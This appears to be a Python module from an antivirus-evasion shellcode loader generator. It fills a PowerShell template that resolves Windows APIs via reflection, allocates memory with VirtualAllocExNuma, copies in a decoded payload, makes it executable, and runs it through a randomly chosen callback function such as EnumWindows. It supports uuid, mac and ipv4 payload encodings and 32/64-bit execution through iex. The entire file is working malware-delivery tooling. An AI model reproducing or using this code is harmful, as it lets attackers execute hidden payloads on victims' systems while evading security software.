#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2022-02-25 14:46:40
# @Author  : Your Name (you@example.org)
# @Link    : http://example.org
# @Version : $Id$

import random


def toPs1(Ciphertext, decodeContent):
	'''
    整合ps1代码函数
    :: param: string -> Ciphertext, string -> decodeContent
    :: return: string -> ps1Content
    '''

	ps1Content = '''Set-StrictMode -Version 2

$JustDoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}
	
$CipherText = "<Ciphertext>"

$var_Gcp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll GetCurrentProcess), (func_get_delegate_type @([UInt32]) ([IntPtr])))

$var_VaExNuma = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAllocExNuma), (func_get_delegate_type @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_VaExNuma.Invoke($var_Gcp.Invoke('1'), [IntPtr]::Zero, $CipherText.Length, 0x3000, 0x04, 0)

<decode>

[System.Runtime.InteropServices.Marshal]::Copy($String, 0, $var_buffer, $String.length)

[UInt32]$OldProtectFlag = 0
$var_VaP = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualProtect), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$var_VaP.Invoke($var_buffer, $String.Length, 0x40, [Ref]$OldProtectFlag)

<callback>
'@

'''
	
	callbackList = [
		"$var_Ecw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address user32.dll EnumChildWindows), (func_get_delegate_type @([IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))\n\t$var_Ecw.Invoke([IntPtr]::Zero, $var_buffer, [IntPtr]::Zero)",
		"$var_Edm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address user32.dll EnumDisplayMonitors), (func_get_delegate_type @([IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))\n\t$var_Edm.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $var_buffer, [IntPtr]::Zero)",
		"$var_Eps = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address powrprof.dll EnumPwrSchemes), (func_get_delegate_type @([IntPtr], [UInt32]) ([IntPtr])))\n\t$var_Eps.Invoke($var_buffer, 0)",
		"$var_Esle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll EnumSystemLocalesEx), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([IntPtr])))\n\t$var_Esle.Invoke($var_buffer, 0, 0, [IntPtr]::zero)",
		"$var_Ew = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address user32.dll EnumWindows), (func_get_delegate_type @([IntPtr], [IntPtr]) ([IntPtr])))\n\t$var_Ew.Invoke($var_buffer, [IntPtr]::zero)"
	]

	ps1Content = ps1Content.replace('<Ciphertext>', Ciphertext)
	ps1Content = ps1Content.replace('<decode>', decodeContent)
	ps1Content = ps1Content.replace('<callback>', random.choice(callbackList))

	return ps1Content


def EncryptunCompileTrim(ps1Content, EncryptType):
	if EncryptType == 'uuid':
		ps1Content = ps1Content.replace("$var_buffer = $var_VaExNuma.Invoke($var_Gcp.Invoke('1'), [IntPtr]::Zero, $CipherText.Length, 0x3000, 0x04, 0)", "$var_buffer = $var_VaExNuma.Invoke($var_Gcp.Invoke('1'), [IntPtr]::Zero, $CipherText.Length * 8, 0x3000, 0x04, 0)")
		ps1Content = ps1Content.replace("[System.Runtime.InteropServices.Marshal]::Copy($String, 0, $var_buffer, $String.length)", "")
		ps1Content = ps1Content.replace("$var_VaP.Invoke($var_buffer, $String.Length, 0x40, [Ref]$OldProtectFlag)", "$var_VaP.Invoke($var_buffer, $CipherText.Length * 8, 0x40, [Ref]$OldProtectFlag)")

	if EncryptType == 'mac' or EncryptType == 'ipv4':
		ps1Content = ps1Content.replace("$var_buffer = $var_VaExNuma.Invoke($var_Gcp.Invoke('1'), [IntPtr]::Zero, $CipherText.Length, 0x3000, 0x04, 0)", "$var_buffer = $var_VaExNuma.Invoke($var_Gcp.Invoke('1'), [IntPtr]::Zero, $CipherText.Length * 8, 0x3000, 0x04, 0)")


	return ps1Content


def bitJudge(ps1Content, bit):
	if bit == 'x64':
		ps1Content = ps1Content + 'If ([IntPtr]::size -eq 8) {\n\tiex $JustDoIt\n}\nelse {\n\tstart-job { param($a) iex $a } -RunAs32 -Argument $JustDoIt | wait-job | Receive-Job\n}'
	else:
		ps1Content = ps1Content + 'If ([IntPtr]::size -eq 8) {\n\tstart-job { param($a) iex $a } -RunAs32 -Argument $JustDoIt | wait-job | Receive-Job\n}\nelse {\n\tiex $JustDoIt\n}'

	return ps1Content


